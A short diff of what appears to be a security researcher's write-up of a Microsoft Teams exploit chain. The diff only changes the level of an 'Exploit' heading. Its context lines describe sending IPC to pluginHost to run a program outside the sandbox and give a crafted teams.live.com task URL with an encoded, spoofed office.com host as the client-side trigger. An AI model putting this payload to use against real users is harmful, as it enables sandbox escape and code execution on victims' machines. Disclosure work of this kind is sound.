@@ -341,7 +341,7 @@ var ipc = modules['./lib/renderer/api/ipc-renderer.ts'].exports.default;
 We utilized this to send IPC to pluginHost (see Section 2), and execute a program outside the sandbox.
 
 
-#Exploit
+#### Exploit
 
 Client :  
 `https://teams.live.com/l/task/1ded03cb-ece5-4e7c-9f73-61c375528078?url=https://0e1%252Ekr%5Ccd2c4753c4cb873c7be66e3ffdeae71f71ce33482e9921bab01dc3670a3b4f95%5C%23.office.com/&height=100&width=100&title=hey&fallbackURL=https://aka.ms/hey&completionBotId=&fqdn=teams.live.com`
